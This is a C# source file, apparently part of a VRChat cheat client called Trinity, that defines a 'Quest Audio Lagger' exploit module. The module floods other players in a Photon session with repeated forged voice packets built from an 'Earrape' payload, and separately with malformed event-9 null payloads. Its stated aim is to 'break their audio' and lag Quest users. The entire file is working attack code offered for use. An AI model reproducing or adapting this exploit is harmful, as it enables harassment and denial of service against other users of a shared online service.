using Trinity.SDK.Photon;
using ExitGames.Client.Photon;
using MelonLoader;
using System;
using System.Collections;
using UnityEngine;
using Trinity.SDK;
namespace Trinity.Module.Exploit
{
    internal class qaudiolagger : BaseModule
    {
        public qaudiolagger() : base("Quest Audio\nLagger", "Very loud quest Lagger, will break their audio", Main.Instance.EventQuickMenu, null, true, false) { }

        public override void OnEnable()
        {
            MelonCoroutines.Start(LOUD());
            MelonCoroutines.Start(this.EventNine());
            USpeaker.field_Internal_Static_Single_1 = float.MaxValue;
        }
        public override void OnDisable()
        {
            MelonCoroutines.Stop(LOUD());
            USpeaker.field_Internal_Static_Single_1 = 1;
        }
        IEnumerator LOUD()
        {
            while (this.toggled)
            {

                byte[] VoiceData = Convert.FromBase64String(SDK.Security.SecurityCheck.Earrape);
                byte[] nulldata = new byte[4]; byte[] ServerTime = BitConverter.GetBytes(VRC.SDKBase.Networking.GetServerTimeInMilliseconds());
                Buffer.BlockCopy(nulldata, 0, VoiceData, 0, 4);
                Buffer.BlockCopy(ServerTime, 0, VoiceData, 4, 4);
                for (int i = 0; i < 80; i++)
                {
                    PhotonExtensions.OpRaiseEvent(1, VoiceData, new Photon.Realtime.RaiseEventOptions() { field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others, field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache }, default(SendOptions));
                }
                yield return new WaitForSecondsRealtime(1f);
            }
            yield break;
        }
        IEnumerator EventNine()
        {
            byte[] NullPayload = new byte[8];
            byte[] LocalPlayer = BitConverter.GetBytes(int.Parse($"{PlayerWrapper.LocalPlayer.GetActorNumber()}00001"));
            Buffer.BlockCopy(LocalPlayer, 0, NullPayload, 0, 4);
            while (this.toggled)
            {
                for (int i = 0; i < 80; i++)
                {
                    PhotonExtensions.OpRaiseEvent(9, NullPayload, new Photon.Realtime.RaiseEventOptions { field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others, field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache }, SendOptions.SendReliable);
                }
                yield return new WaitForSecondsRealtime(5f);
            }
            yield break;
        }
    }
}